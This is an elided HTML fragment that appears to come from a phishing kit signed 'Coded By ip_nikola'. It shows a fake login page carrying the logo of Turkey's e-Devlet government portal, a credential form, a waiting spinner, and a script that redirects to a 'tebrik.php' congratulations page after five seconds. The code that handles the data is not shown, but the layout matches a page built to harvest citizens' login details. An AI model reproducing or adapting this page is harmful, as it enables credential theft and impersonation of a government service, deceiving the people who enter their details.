...
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        ...
        <!-- Coded By ip_nikola -->
        <link rel="icon" type="image/png" href="./nikola/favicon.png" sizes="196x196">
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
        <link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
        <link rel="stylesheet" media="all" type="text/css" href="./nikola/bootstrap.v3.3.6.css">
        <link rel="stylesheet" media="all" type="text/css" href="./nikola/bootstrap-switch.v3.3.2.min.css">
        <link rel="stylesheet" media="all" type="text/css" href="./nikola/font-awesome.v4.7.0.css">
        <link rel="stylesheet" media="all" type="text/css" href="./nikola/switchery.min.css">
        <link rel="stylesheet" media="all" type="text/css" href="./nikola/ib-common.css">
        <link rel="stylesheet" media="all" type="text/css" href="./nikola/login.css">
        <link rel="stylesheet" media="all" type="text/css" href="./nikola/otp-responsive.css">
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
        <script src="./nikola/jquery-3.4.1.min.js" type="text/javascript"></script>
        <style>
            *{
...
setTimeout(() => {   window.location.href = "./tebrik.php"; }, 5000);
</script>
        ...
        <form id="loginform" name="loginform" method="post" action="">
                            ...
                            <div id="authcredentials" style="">
                                <div class="row">
                                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                       ...
                                       <h1 style="text-align:center;"><img src="nikola/edevlet.png" style="width:230px;"></h1><br><br>
                    ...
                    <img src="nikola/bekle.gif" width="60px;"><br><br>
